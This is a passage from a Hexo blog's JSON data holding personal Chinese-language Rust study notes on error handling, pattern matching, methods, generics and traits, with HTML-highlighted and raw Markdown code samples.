number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 报错，无法推断你想要parse的类型</span>\n<span class=\"token keyword\">let</span> guess<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">except</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// √</span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// √</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>rust的泛型还要打::，挺怪，但能接受。</p>\n<h2 id=\"异常处理\"><a href=\"#异常处理\" class=\"headerlink\" title=\"异常处理\"></a>异常处理</h2><blockquote>\n<h2 id=\"Rust-的错误哲学\"><a href=\"#Rust-的错误哲学\" class=\"headerlink\" title=\"Rust 的错误哲学\"></a>Rust 的错误哲学</h2><p>错误对于软件来说是不可避免的，因此一门优秀的编程语言必须有其完整的错误处理哲学。在很多情况下，Rust 需要你承认自己的代码可能会出错，并提前采取行动，来处理这些错误。</p>\n<p>Rust 中的错误主要分为两类：</p>\n<ul>\n<li><strong>可恢复错误</strong>，通常用于从系统全局角度来看可以接受的错误，例如处理用户的访问、操作等错误，这些错误只会影响某个用户自身的操作进程，而不会对系统的全局稳定性产生影响</li>\n<li><strong>不可恢复错误</strong>，刚好相反，该错误通常是全局性或者系统性的错误，例如数组越界访问，系统启动时发生了影响启动流程的错误等等，这些错误的影响往往对于系统来说是致命的</li>\n</ul>\n<p>很多编程语言，并不会区分这些错误，而是直接采用异常的方式去处理。Rust 没有异常，但是 Rust 也有自己的卧龙凤雏：<code>Result&lt;T, E&gt;</code> 用于可恢复错误，<code>panic!</code> 用于不可恢复错误。</p>\n<p>摘自 《Rust Crouse》</p>\n</blockquote>\n<p>我们可以直接使用<code>panic!</code>来抛出一个异常，让程序直接崩溃，但一般我们不会这么做。一般我们会大量的使用<code>Result</code>来进行异常的传递，毕竟Rust里是没有try catch的，而我们抛出异常的目的一般不会是直接让整个程序崩溃，而是要让其他人去处理这个异常。</p>\n<p>讲真，我觉得rust的异常处理设计得简直一级棒，比go和java的不知道高到哪里去了，kotlin的Result API也不过是是对其拙劣的模仿（暴论）~</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// expect 如产生错误 直接panic!</span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 比较类似go的异常处理方式，不过语法更加好看</span>\n<span class=\"token comment\">// 不过这种方式写多了会造成多层嵌套</span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">match</span> guess <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You guessed: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>同时，为了避免模板代码，rust有一个<code>?</code>的语法糖，可以在返回值为Result的函数中使用</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">core<span class=\"token punctuation\">::</span></span>time<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token punctuation\">&#123;</span><span class=\"token namespace\">fs<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">,</span> thread<span class=\"token punctuation\">,</span> <span class=\"token namespace\">io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Write</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// &lt;-</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125; \\n\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// on the moment, manually remove the file hello.txt</span>\n    <span class=\"token keyword\">let</span> ten_millis <span class=\"token operator\">=</span> <span class=\"token namespace\">time<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Duration</span><span class=\"token punctuation\">::</span><span class=\"token function\">from_millis</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token namespace\">thread<span class=\"token punctuation\">::</span></span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span>ten_millis<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125; \\n\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> r <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">write_all</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"Hello, world!\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Result is &#123;:?&#125; \\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">drop</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这个<code>?</code>对应的模板代码如下</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> f <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> f<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> file<span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">return</span> <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如此便大幅简化了开发流程，实属厉害</p>\n<p>那么，rust有没有办法捕获异常呢</p>\n<p>有</p>\n<blockquote>\n<p>最后，再来说个例外，<code>panic::catch_unwind</code>。</p>\n<p>先看下它的用法：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span>panic<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token namespace\">panic<span class=\"token punctuation\">::</span></span><span class=\"token function\">catch_unwind</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">is_ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token namespace\">panic<span class=\"token punctuation\">::</span></span><span class=\"token function\">catch_unwind</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">panic!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"oh no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">is_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>没错，它的行为几乎就是try&#x2F;catch了：panic！宏被捕获了，程序并也没有挂，返回了Err。尽管如此，Rust的目的并不是让它成为try&#x2F;catch机制的实现，而是当Rust和其他编程语言互动时，避免其他语言代码块throw出异常。所以呢，错误处理的正道还是用<strong>Result</strong>。</p>\n<p>从catch_unwind的名字上，需要留意下unwind这个限定词，它意味着只有默认进行栈反解的panic可以被捕获到，如果是设为直接终止程序的panic，就逮不住了。</p>\n<p>细节可进一步参考<a href=\"https://link.zhihu.com/?target=https://doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html\">Rust Documentation</a>。</p>\n</blockquote>\n"},{"title":"Rust笔记其二","date":"2022-05-01T00:00:00.000Z","author":"寒雨","hide":false,"summary":"流程控制&模式匹配&方法&泛型&trait","_content":"\n# Rust笔记其二\n\n## 流程控制\n\n比较类似go吧，if for这些后面跟的表达式都不用用括号包起来\n\n~~~rust\n// 这里比较像kotlin，没有采用传统的三元运算符\nlet condition = true;\nlet number = if condition {\n        5\n    } else {\n        6\n    };\n\n// 多分支\nlet n = 6;\n\nif n % 4 == 0 {\n    println!(\"number is divisible by 4\");\n} else if n % 3 == 0 {\n    println!(\"number is divisible by 3\");\n} else if n % 2 == 0 {\n    println!(\"number is divisible by 2\");\n} else {\n    println!(\"number is not divisible by 4, 3, or 2\");\n}\n\n// for循环\n// 有点类似kt, 支持区间\nfor i in 1..=5 {\n   println!(\"{}\", i);\n}\n\n// 遍历集合\n// 注意所有权的转移，不取引用的话下面就用不了container了\nfor item in &container {\n  // ...\n}\n\n// 遍历时修改\nfor item in &mut collection {\n  // ...\n}\n\n// 遍历index和值\nlet a = [4, 3, 2, 1];\n// `.iter()` 方法把 `a` 数组变成一个迭代器\nfor (i, v) in a.iter().enumerate() {\n   println!(\"第{}个元素是{}\", i + 1, v);\n}\n\n// 无限循环 等价于while(true)\nloop {\n   println!(\"again!\");\n}\n~~~\n\n> 值得注意的是，rust的break既可以单独使用，也可以让他返回一个值\n>\n> loop是一个表达式，因而可以返回一个值\n\n## 模式匹配\n\n> 画重点，rust的模式匹配非常强大，以至于其他语言都在抄\n\n### match\n\n~~~rust\n// 这里是比较类似于其他语言switch的用法\n// 但match比switch强大得多\nenum Coin {\n    Penny,\n    Nickel,\n    Dime,\n    Quarter,\n}\n\nfn value_in_cents(coin: Coin) -> u8 {\n    match coin {\n        Coin::Penny =>  {\n            println!(\"Lucky penny!\");\n            1\n        },\n        Coin::Nickel => 5,\n        Coin::Dime => 10,\n        Coin::Quarter => 25,\n    }\n}\n\n// match是一个表达式，可以用来赋值\nenum IpAddr {\n   Ipv4,\n   Ipv6\n}\n\nfn main() {\n    let ip1 = IpAddr::Ipv6;\n    let ip_str = match ip1 {\n        IpAddr::Ipv4 => \"127.0.0.1\",\n        _ => \"::1\",\n    };\n\n    println!(\"{}\", ip_str);\n}\n\n// 模式绑定 （有点像解构）\nenum Coin {\n    Penny,\n    Nickel,\n    Dime,\n    Quarter(UsState), // 25美分硬币\n}\n\nfn value_in_cents(coin: Coin) -> u8 {\n    match coin {\n        Coin::Penny => 1,\n        Coin::Nickel => 5,\n        Coin::Dime => 10,\n        // 这里可以通过这样的写法直接拿到state\n        Coin::Quarter(state) => {\n            println!(\"State quarter from {:?}!\", state);\n            25\n        },\n    }\n}\n\n// 有时会遇到只有一个模式的值需要被处理，其它值直接忽略的场景，如果用 match 来处理就要写成下面这样\nlet v = Some(3u8);\nmatch v {\n   Some(3) => println!(\"three\"),\n   _ => (),\n}\n\n// 这种情况下可以直接用语法糖简化\nif let Some(3) = v {\n    println!(\"three\");\n}\n~~~\n\n> match的匹配必须穷尽所有的情况，也就是如果不列出所有的可能，必须定义_ =>分支\n\n### matches!宏\n\n> 跟java中的String#matches比较类似，如果我只是想知道某个实例是否匹配上了我给与的模式，可以不用特意去macth,直接调用matches!宏。\n\n~~~rust\n// 使用match\nlet foo = 'f';\nlet matched = match foo {\n    'A'..'Z' | 'a'..'z' => true,\n    _ => false,\n}\n\n// 使用matches!\nlet foo = 'f';\nlet matched = matches!(foo, 'A'..'Z' | 'a'..'z');\n~~~\n\n### 解构\n\n解构其实也是模式匹配实现的，在上一节笔记中已经写过了，不做详细介绍\n\n### 匹配守卫\n\n> 在要匹配的模式后面可以加上if condition，来对模式匹配进行进一步限制\n\n~~~rust\nfn main() {\n    let x = Some(5);\n    let y = 10;\n\n    match x {\n        Some(50) => println!(\"Got 50\"),\n        Some(n) if n == y => println!(\"Matched, n = {}\", n),\n        _ => println!(\"Default case, x = {:?}\", x),\n    }\n\n    println!(\"at the end: x = {:?}, y = {}\", x, y);\n}\n~~~\n\n> **匹配守卫的条件会作用于所有的模式**\n\n~~~rust\nlet x = 4;\nlet y = false;\n\nmatch x {\n    4 | 5 | 6 if y => println!(\"yes\"),\n    _ => println!(\"no\"),\n}\n~~~\n\n> 这个例子中看起来好像 `if y` 只作用于 `6`，但实际上匹配守卫 `if y` 作用于 `4`、`5` **和** `6` ，在满足 `x` 属于 `4 | 5 | 6` 后才会判断 `y` 是否为 `true`：\n\n### @绑定\n\n> 说白了就是我们即想要模式匹配，匹配成功后又想通过解构的形式拿到对应的值\n>\n> 小孩子才做选择 大人全都要！\n\n~~~rust\nenum Message {\n    Hello { id: i32 },\n}\n\nlet msg = Message::Hello { id: 5 };\n\nmatch msg {\n    Message::Hello { id: id_variable @ 3..=7 } => {\n        println!(\"Found an id in range: {}\", id_variable)\n    },\n    Message::Hello { id: 10..=12 } => {\n        println!(\"Found an id in another range\")\n    },\n    Message::Hello { id } => {\n        println!(\"Found some other id: {}\", id)\n    },\n}\n~~~\n\n上面这个例子的第一个分支中，我们既通过解构拿到了id，又对他进行了模式匹配: 在3..=7范围内才能通过。\n\n注意:\n\n> 考虑下面一段代码:\n>\n> ```rust\n> fn main() {\n>     match 1 {\n>         num @ 1 | 2 => {\n>             println!(\"{}\", num);\n>         }\n>         _ => {}\n>     }\n> }\n> ```\n>\n> 编译不通过，是因为 `num` 没有绑定到所有的模式上，只绑定了模式 `1`，你可能会试图通过这个方式来解决：\n>\n> ```rust\n> num @ (1 | 2)\n> ```\n>\n> 但是，如果你用的是 Rust 1.53 之前的版本，那这种写法会报错，因为编译器不支持。\n\n## 方法\n\nRust使用`impl`块来定义方法，多说无益，先来一段示例代码\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    // new是Circle的关联函数，因为它的第一个参数不是self\n    // 这种方法往往用于初始化当前结构体的实例\n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n\n    // Circle的方法，&self表示借用当前的Circle结构体\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\n与java的不同在于，要实现一个类似于java类的结构，我们需要定义struct和它的impl，相当于字段的声明和方法的声明被分开了。\n\n并且，impl可以有很多个\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n}\n\nimpl Circle {\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\n这样做的好处在于可以让方法的声明更加清晰，我们可以把为完成同一种职能的方法声明在一个impl块中，这样比起塞在一块会有条理得多。\n\n### 关联函数&方法\n\n看到`函数`和`方法`二字我们便可以知晓他们的不同。函数不会绑定在一个对象上，而方法会。\n\n我们先来看一下如何声明关联函数与方法\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    // new是Circle的关联函数，因为它的第一个参数不是self\n    // 这种方法往往用于初始化当前结构体的实例\n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n\n    // Circle的方法，&self表示借用当前的Circle结构体\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\n可以看到，所谓的方法，就是传入了一个`&self`的函数，这是一个语法糖，实际上是 `self: &Self` 的简写。意思是我们传入了一个这个类型的实例的引用。这样在调用时便可以直接`circle.area()`。\n\n而没有传入自身引用的关联函数又是什么呢？我只说四个字——**静态方法**。\n\n### 为枚举实现方法\n\n~~~rust\n#![allow(unused)]\nfn main() {\nenum Message {\n    Quit,\n    Move { x: i32, y: i32 },\n    Write(String),\n    ChangeColor(i32, i32, i32),\n}\n\nimpl Message {\n    fn call(&self) {\n        // 在这里定义方法体\n    }\n}\n\n\tlet m = Message::Write(String::from(\"hello\"));\n\tm.call();\n}\n~~~\n\n## 泛型&特征(trait)\n\n### 声明一个基础的泛型\n\n~~~rust\nfn add<T>(a:T, b:T) -> T {\n    a + b\n}\n\nfn main() {\n    println!(\"add i8: {}\", add(2i8, 3i8));\n    println!(\"add i32: {}\", add(20, 30));\n    println!(\"add f64: {}\", add(1.23, 1.23));\n}\n~~~\n\n当然可以看出来，这串代码是跑不了的，不是所有类型都允许相加的\n\n### 使用trait约束泛型的类型\n\n那我们就尝试对他的类型进行约束\n\n这里语法比较类似kotlin\n\n~~~rust\nfn add<T: std::ops::Add<Output = T>>(a:T, b:T) -> T {\n    a + b\n}\n~~~\n\n这里的`std::ops::Add<Output = T>`是不是比较类似于kotlin的接口？在rust中它叫做`trait `,特征。而实现了`std::ops::Add<Output = T>`,就支持了相加，泛型output就是相加后结果的类型。\n\n> 这些都说明一个道理，特征定义了**一个可以被共享的行为，只要实现了特征，你就能使用该行为**。\n\n### 在枚举中使用泛型\n\n~~~rust\nenum Option<T> {\n    Some(T),\n    None,\n}\n\nenum Result<T, E> {\n    Ok(T),\n    Err(E),\n}\n~~~\n\n### 在方法中使用泛型\n\n~~~rust\nstruct Point<T> {\n    x: T,\n    y: T,\n}\n\nimpl<T> Point<T> {\n    fn x(&self) -> &T {\n        &self.x\n    }\n}\n\nfn main() {\n    let p = Point { x: 5, y: 10 };\n\n    println!(\"p.x = {}\", p.x());\n}\n~~~\n\n> 这个例子中，`T,U` 是定义在结构体 `Point` 上的泛型参数，`V,W` 是单独定义在方法 `mixup` 上的泛型参数，它们并不冲突，说白了，你可以理解为，一个是结构体泛型，一个是函数泛型。\n\n### 为具体的泛型类型实现方法\n\n> 对于 `Point<T>` 类型，你不仅能定义基于 `T` 的方法，还能针对特定的具体类型，进行方法定义：\n>\n> ```rust\n> impl Point<f32> {\n>     fn distance_from_origin(&self) -> f32 {\n>         (self.x.powi(2) + self.y.powi(2)).sqrt()\n>     }\n> }\n> ```\n>\n> 这段代码意味着 `Point<f32>` 类型会有一个方法 `distance_from_origin`，而其他 `T` 不是 `f32` 类型的 `Point<T> `实例则没有定义此方法。这个方法计算点实例与坐标`(0.0, 0.0)` 之间的距离，并使用了只能用于浮点型的数学运算符。\n>\n> 这样我们就能针对特定的泛型类型实现某个特定的方法，对于其它泛型类型则没有定义该方法。\n\n### const 泛型\n\n~~~rust\nfn display_array<T: std::fmt::Debug>(arr: &[T]) {\n    println!(\"{:?}\", arr);\n}\nfn main() {\n    let arr: [i32; 3] = [1, 2, 3];\n    display_array(&arr);\n\n    let arr: [i32;2] = [1,2];\n    display_array(&arr);\n}\n~~~\n\n首先看看这段代码，如果我们想要约束传入切片的大小该怎么做呢\n\nconst泛型其实就是针对常量值的泛型\n\n~~~rust\nfn display_array<T: std::fmt::Debug, const N: usize>(arr: [T; N]) {\n    println!(\"{:?}\", arr);\n}\nfn main() {\n    let arr: [i32; 3] = [1, 2, 3];\n    display_array(arr);\n\n    let arr: [i32; 2] = [1, 2];\n    display_array(arr);\n}\n~~~\n\n这里我们声明了一个常量泛型usize，这个usize可以放到入参处切片的类型中去，这便是常量泛型的用法。\n\n### 泛型的性能\n\n> 在 Rust 中泛型是零成本的抽象，意味着你在使用泛型时，完全不用担心性能上的问题。\n>\n> 但是任何选择都是权衡得失的，既然我们获得了性能上的巨大优势，那么又失去了什么呢？Rust 是在编译期为泛型对应的多个类型，生成各自的代码，因此损失了编译速度和增大了最终生成文件的大小。\n>\n> 具体来说：\n>\n> Rust 通过在编译时进行泛型代码的 **单态化**(*monomorphization*)来保证效率。单态化是一个通过填充编译时使用的具体类型，将通用代码转换为特定代码的过程。\n>\n> 编译器所做的工作正好与我们创建泛型函数的步骤相反，编译器寻找所有泛型代码被调用的位置并针对具体类型生成代码。\n\n## 特征(trait)\n\n其实对应的就是java的interface，不过似乎设计得更好\n\n### 定义特征\n\n~~~rust\npub trait Summary {\n    fn summarize(&self) -> String;\n    \n    // 允许有默认实现\n    // 默认实现中允许调用其他方法\n    fn summarize1(&self) -> String {\n        \"巴拉巴拉\" + self.summarize()\n    }\n}\n~~~\n\n### 为类型实现特征\n\n~~~rust\npub trait Summary {\n    fn summarize(&self) -> String;\n}\npub struct Post {\n    pub title: String, // 标题\n    pub author: String, // 作者\n    pub content: String, // 内容\n}\n\nimpl Summary for Post {\n    fn summarize(&self) -> String {\n        format!(\"文章{}, 作者是{}\", self.title, self.author)\n    }\n}\n\npub struct Weibo {\n    pub username: String,\n    pub content: String\n}\n\nimpl Summary for Weibo {\n    fn summarize(&self) -> String {\n        format!(\"{}发表了微博{}\", self.username, self.content)\n    }\n}\n~~~\n\n这样的设计让Rust实现Kotlin那样的拓展函数成为可能。\n\n### 孤儿原则\n\n> 上面我们将 `Summary` 定义成了 `pub` 公开的。这样，如果他人想要使用我们的 `Summary` 特征，则可以引入到他们的包中，然后再进行实现。\n>\n> 关于特征实现与定义的位置，有一条非常重要的原则：**如果你想要为类型 `A` 实现特征 `T`，那么 `A` 或者 `T` 至少有一个是在当前作用域中定义的！**。例如我们可以为上面的 `Post` 类型实现标准库中的 `Display` 特征，这是因为 `Post` 类型定义在当前的作用域中。同时，我们也可以在当前包中为 `String` 类型实现 `Summary` 特征，因为 `Summary` 定义在当前作用域中。\n>\n> 但是你无法在当前作用域中，为 `String` 类型实现 `Display` 特征，因为它们俩都定义在标准库中，其定义所在的位置都不在当前作用域，跟你半毛钱关系都没有，看看就行了。\n>\n> 该规则被称为**孤儿规则**，可以确保其它人编写的代码不会破坏你的代码，也确保了你不会莫名其妙就破坏了风马牛不相及的代码。\n\n### 形参约束\n\n~~~rust\npub fn notify(item: &impl Summary) {\n    println!(\"Breaking news! {}\", item.summarize());\n}\n\n// 多重约束\npub fn notify(item: &(impl Summary + Display)) {\n    //...\n}\n\n// 不使用where约束\nfn some_function<T: Display + Clone, U: Clone + Debug>(t: &T, u: &U) -> i32 {\n    //...\n}\n\n// 使用where约束\nfn some_function<T, U>(t: &T, u: &U) -> i32\n    where T: Display + Clone,\n          U: Clone + Debug\n{\n    //...\n}\n~~~\n\n> 虽然 `impl Trait` 这种语法非常好理解，但是实际上它只是一个语法糖：\n>\n> ```rust\n> pub fn notify<T: Summary>(item: &T) {\n>     println!(\"Breaking news! {}\", item.summarize());\n> }\n> ```\n\n// TODO","source":"_posts/rust-note-#2.md","raw":"---\ntitle: Rust笔记其二\ndate: 2022-05\nauthor: 寒雨\nhide: false\nsummary: 流程控制&模式匹配&方法&泛型&trait\ncategories: 笔记\ntags:\n  - Rust\n  - Rust学习笔记\n---\n\n# Rust笔记其二\n\n## 流程控制\n\n比较类似go吧，if for这些后面跟的表达式都不用用括号包起来\n\n~~~rust\n// 这里比较像kotlin，没有采用传统的三元运算符\nlet condition = true;\nlet number = if condition {\n        5\n    } else {\n        6\n    };\n\n// 多分支\nlet n = 6;\n\nif n % 4 == 0 {\n    println!(\"number is divisible by 4\");\n} else if n % 3 == 0 {\n    println!(\"number is divisible by 3\");\n} else if n % 2 == 0 {\n    println!(\"number is divisible by 2\");\n} else {\n    println!(\"number is not divisible by 4, 3, or 2\");\n}\n\n// for循环\n// 有点类似kt, 支持区间\nfor i in 1..=5 {\n   println!(\"{}\", i);\n}\n\n// 遍历集合\n// 注意所有权的转移，不取引用的话下面就用不了container了\nfor item in &container {\n  // ...\n}\n\n// 遍历时修改\nfor item in &mut collection {\n  // ...\n}\n\n// 遍历index和值\nlet a = [4, 3, 2, 1];\n// `.iter()` 方法把 `a` 数组变成一个迭代器\nfor (i, v) in a.iter().enumerate() {\n   println!(\"第{}个元素是{}\", i + 1, 